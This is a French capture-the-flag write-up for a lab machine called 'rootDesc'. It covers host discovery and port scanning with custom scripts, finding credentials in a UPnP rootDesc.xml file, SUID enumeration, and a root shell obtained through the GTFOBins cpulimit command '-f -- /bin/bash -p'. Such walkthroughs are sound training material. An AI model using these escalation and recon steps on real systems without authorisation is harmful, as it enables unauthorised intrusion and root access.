# rootDesc

🖥️ **rNET**

Découverte d’hotes

```
┌──[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./rNET.sh 
                                               
░       ░░░   ░░░  ░░        ░░        ░
▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒
▓       ▓▓▓  ▓  ▓  ▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓
█  ███  ███  ██    ██  ███████████  ████
█  ████  ██  ███   ██        █████  ████
                                                   
                                                
by M0rPH3U53

🔍 Scan ARP...100%
 
[+] Hotes 
 
┌────────────────┬───────────────────┬──────────────────────────────┐
│       🖥️       │         ⚙️        │              🏭              │
├────────────────┼───────────────────┼──────────────────────────────┤
│ 192.168.56.1   │ 0a:00:27:00:00:00 │ Unknown vendor               │
│ 192.168.56.2   │ 08:00:27:06:49:51 │ PCS Systemtechnik GmbH       │
│ 192.168.56.254 │ 08:00:27:05:87:b3 │ PCS Systemtechnik GmbH       │
└────────────────┴───────────────────┴──────────────────────────────┘
 
[+] Total: 3
```

&nbsp;

<span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
 
📄 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

**🕵️‍♀️ UPnP**

L’upnp est une mine d’info

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo nmap -sU --open 192.168.56.254
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-11 18:22 UTC
Nmap scan report for 192.168.56.254
Host is up (0.00032s latency).

PORT     STATE SERVICE
1900/udp open  upnp
MAC Address: 08:00:27:70:1D:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```

&nbsp;

**🤖 wUP**

En regardant le fichier xml on a pu trouver un login

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $./wUP.sh
  
'##:::::'##:'##::::'##:'########::
 ##:'##: ##: ##:::: ##: ##.... ##:
 ##: ##: ##: ##:::: ##: ##:::: ##:
 ##: ##: ##: ##:::: ##: ########::
 ##: ##: ##: ##:::: ##: ##.....:::
 ##: ##: ##: ##:::: ##: ##::::::::
. ###. ###::. #######:: ##::::::::
:...::...::::.......:::..:::::::::                       

by M0rPH3U53

🔍 Scan UPnP...100%

📥 http://192.168.56.254:8888/rootDesc.xml
```

&nbsp;

![xml-fichier.png](../../_resources/xml-fichier.png)

&nbsp;

**🛰️ fullEx**

Élévation de privilège

```
upnp@rooted:~/fullEx$ ./fullEx.sh -LinPeas

╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 483K  5 avril 01:29 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 19K 17 janv.  2025 /usr/lib/polkit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 51K  8 mars   2025 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 31K 17 mai    2024 /usr/bin/cpulimit
-rwsr-xr-x 1 root root 19K 10 mai    2025 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 55K 10 mai    2025 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 116K 19 avril  2025 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 87K 19 avril  2025 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 71K 10 mai    2025 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 70K 19 avril  2025 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 300K 11 févr. 20:22 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 52K 19 avril  2025 /usr/bin/chsh
-rwsr-xr-x 1 root root 83K 10 mai    2025 /usr/bin/su

```

&nbsp;

#️⃣ **GTFobin - cpulimit**

https://gtfobins.org/gtfobins/cpulimit/#shell

```
upnp@rooted:~/Downloads$ ./cpulimit -l 100 -f -- /bin/bash -p
Process 23526 detected
bash-5.2# id
uid=1001(redteam) gid=1001(redteam) euid=0(root) groupes=1001(redteam),100(users)
```